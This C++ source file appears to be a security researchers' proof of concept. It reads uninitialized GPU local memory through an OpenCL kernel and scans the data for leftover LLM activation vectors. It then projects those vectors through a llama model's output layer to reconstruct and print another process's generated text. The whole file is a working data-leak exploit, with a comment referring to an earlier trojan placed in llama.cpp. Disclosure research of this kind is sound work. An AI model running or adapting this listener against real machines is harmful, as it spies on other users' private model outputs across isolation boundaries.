/*
   Copyright 2023 Trail of Bits

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/


#include <vector>
#include <iostream>
#include <cassert>
#include <vector>
#include <algorithm>
#include <fstream>
#include <thread>
#include <cmath>
#include <mutex>

std::mutex m;

// For command line
#include "cxxopts.hpp"

#define MAX_SHMEM_SIZE (65536)

// Some common sizes across main and the kernel

#include <CL/cl2.hpp>
using namespace cl;


// for sorting the histogram
bool cmp(std::pair<int, int> a,
	 std::pair<int, int> b) {
    return a.second > b.second;
}

#include "llama.h"
static llama_context ** g_ctx;
llama_model * model;
int prev_max = -1;

void do_mult(float *dst, float *i) {
  //printf("in do_mult\n");
  struct ggml_init_params params = {
    .mem_size   = 144944 + 33312 + 289888,
    .mem_buffer = NULL,
    };

  struct ggml_context * ctx0 = ggml_init(params);
  struct ggml_tensor * y = ggml_new_tensor_1d(ctx0, GGML_TYPE_F32, 4096);
  memcpy(y->data, i, 4096*sizeof(float));
  ggml_set_param(ctx0, y);
  struct ggml_tensor * cur;

  ggml_cgraph gf = {};
  cur = ggml_mul_mat(ctx0, get_output(model), y);
  ggml_set_name(cur, "result_output");
  ggml_build_forward_expand(&gf, cur);
  gf.n_threads = 1;
  ggml_graph_compute(ctx0, &gf);
  memcpy(dst, (float *) ggml_get_data(cur), sizeof(float)*32001);

  float max = 0.0f;
  int arg_max = 0;
  for (int i = 0; i < 32001; i++) {
    if (dst[i] > max) {
      max = dst[i];
      arg_max = i;
    }
  }
  if (arg_max != prev_max && arg_max < 32001) {
    printf("%s", llama_token_to_str(*g_ctx, arg_max));
    prev_max = arg_max;
  }  

  ggml_free(ctx0);
}

void listener_thread(Device d, int gridSize, int workgroupSize, int tid) {

  Context context({d});
  Program::Sources sources;
  
  std::ifstream t("./examples/clCovertListener/covertCLListener.cl");
  std::stringstream buffer;
  buffer << t.rdbuf();
  
  sources.push_back({buffer.str().c_str(),buffer.str().length()});
  
  Program program(context,sources);
  if(program.build({d})!=CL_SUCCESS){
    std::cout<<" Error building: "<<program.getBuildInfo<CL_PROGRAM_BUILD_LOG>(d)<<"\n";
    exit(1);
  }
  
  int globalSize = gridSize*workgroupSize;
  int size = MAX_SHMEM_SIZE * gridSize;
  int size_int = size/4;
  
  // create buffers on the device
  Buffer buffer_A(context,CL_MEM_READ_WRITE,size);
  Buffer buffer_B(context,CL_MEM_READ_WRITE,size);
  Buffer buffer_C(context,CL_MEM_READ_WRITE,size);
  
  float * A = (float*) malloc(size);
  float * B = (float*) malloc(size);
  float * C = (float*) malloc(size);
  
  CommandQueue queue(context,d);
  
  string fname = "readValues";
  int iters = 0;
  
  Kernel covertListener=cl::Kernel(program,"covertListener");
  covertListener.setArg(0,buffer_A);
  covertListener.setArg(1,buffer_B);
  covertListener.setArg(2,buffer_C);

  float* dst = (float *) malloc(sizeof(float)*32001);
  float* input = (float *) malloc(sizeof(float)*4096);
  for (int i = 0; i < 32001; i++) {
    dst[i] = -1;

  }
  for (int i = 0; i < 4096; i++) {
    input[i] = 0.0f;
  }

  bool found = false;
  while (1) {
    iters++;

    // just to flush stdout occassionally if needed
    /*if (iters % 1000 == 0) {
      printf("\n");
      }*/
    
    for (int i = 0; i < size_int; i++) {
      A[i] = B[i] = C[i] = 0.0f;
    }
    
    queue.enqueueWriteBuffer(buffer_A, CL_TRUE, 0, size, A);
    queue.enqueueWriteBuffer(buffer_B, CL_TRUE, 0, size ,B);
    queue.enqueueWriteBuffer(buffer_C, CL_TRUE, 0, size ,C);
    
    queue.enqueueNDRangeKernel(covertListener, 0, NDRange(globalSize),NDRange(workgroupSize));
    queue.finish();
    
    queue.enqueueReadBuffer(buffer_C, CL_TRUE, 0, size, C);
    
    found = false;
    for(int i=2;i<size_int;i++) {

      // Initial loop when the trojan was in llama.cpp
      /*if (C[i] == 0.125f && size_int - (4096*3) > i) {
	  if (C[i+1] == 0.125f) {
	    for (int k = 0; k < 4096*3; k++) {
	      //input[k] = C[i+k];
	      std::cout << C[i+k] << std::endl;
	    }
	    found = true;
	    std::cout << "END" << std::endl;
	    //break;
	  }
	  }*/

      // Now we just look for 4096 elements seperated by a bunch of 0's.

      // First check if the previous two elements were 0, and our
      // current index is not 0, and we have enough space (by a factor of 2)
      if (C[i-2] == 0.0f && C[i-1] == 0.0f && C[i] != 0.0f && size_int - (4096*2) > i) {
	int k;
	int zeros = 0;

	for (k = 0; k < 4096; k++) {
	  input[k] = C[i+k];
	  if (C[i+k] == 0.0f) {
	    zeros++;
	  }
	  if (zeros > 5) {
	    break;
	  }
	}
	if (zeros < 5 && C[i+k] == 0.0f && C[i+k+1] == 0.0f) {
	  found = true;
	  //debug
	  /*std::cout << "BEGIN" << std::endl;
	  for (int k = 0; k < 4096; k++) {
	    std::cout << C[i+k] << std::endl;
	    }*/
	  break;
	}		
      }	      
    }
    if (found) {
      //return;
      m.lock();
      do_mult(dst, input);
      m.unlock();
    }    
  }  
}

int main(int argc, char* argv[]) {

  cxxopts::Options options("covertListener", "reads values from GPU memory to search for canaries written by the covert listener");

  // Could think about shared memory size as a parameter, but it would
  // probably need to be declared in a higher-level script because it needs
  // to modify the kernel
  options.add_options()
    ("l,list", "List devices") // a bool parameter
    ("wgs, workgroup-size", "Number of threads in the workgroup", cxxopts::value<int>()->default_value("256"))
    ("gs, grid-size", "Number of workgroups per grid", cxxopts::value<int>()->default_value("1"))
    ("d,device", "Device id (int)", cxxopts::value<int>()->default_value("0"))
    ("t,threads", "How many threads to run with (default 1)", cxxopts::value<int>()->default_value("1"))
    ("m,model", "model file", cxxopts::value<string>()->default_value("models/wizardLM-7B.ggmlv3.q5_0.bin"))
    ("h,help", "Print usage");


  auto result = options.parse(argc, argv);

  if (result.count("help")) {
      std::cout << options.help() << std::endl;
      exit(0);
  }

  vector<Platform> platforms;
  Platform::get(&platforms);

  std::vector<cl::Device> all_devices;
  int id = 0;

  for (auto p: platforms) {
    std::vector<Device> local_devices;
    p.getDevices(CL_DEVICE_TYPE_ALL, &local_devices);
    for (auto d: local_devices) {
      all_devices.push_back(d);
      id++;
    }
  }     

  id = 0;
  if (result.count("list")) {
    for (auto p: platforms) {
      std::cout << "platform: " << p.getInfo<CL_PLATFORM_NAME>() << std::endl;
      std::vector<Device> local_devices;
      p.getDevices(CL_DEVICE_TYPE_ALL, &local_devices);
      for (auto d: local_devices) {
	std::cout << "  device " << id << ": " << d.getInfo<CL_DEVICE_NAME>() << std::endl;
	std::cout << "   local memory size: " << d.getInfo<CL_DEVICE_LOCAL_MEM_SIZE>() << " type: " << d.getInfo<CL_DEVICE_LOCAL_MEM_TYPE>() << std::endl;
	all_devices.push_back(d);
	id++;
      }
      std::cout << std::endl;
      
    }
    
    exit(0);
  }

  int num_threads = result["threads"].as<int>();
  std::thread threads[num_threads];

  int deviceID = result["device"].as<int>();
  Device d = all_devices[deviceID];

  std::cout << "using device: " << d.getInfo<CL_DEVICE_NAME>() << std::endl;
  std::cout << "number of listener threads: " << num_threads << std::endl;

  int gridSize = result["grid-size"].as<int>();
  int workgroupSize = result["workgroup-size"].as<int>();

  llama_init_backend(false);
  
  
  llama_context * ctx;
  g_ctx = &ctx;

  string model_path = result["model"].as<string>();

  auto lparams = llama_context_default_params();
  model = llama_load_model_from_file(model_path.c_str(), lparams);

  ctx = llama_new_context_with_model(model, lparams);

  if (model == NULL) {
    fprintf(stderr, "%s: error: unable to load model\n", __func__);
    return 1;
  }

  for (int i = 0; i < num_threads; i++) {
    
    threads[i] = std::thread(listener_thread, d, gridSize, workgroupSize, i);
  }

  for (int i = 0; i < num_threads; i++) {
    threads[i].join();
  }  
}
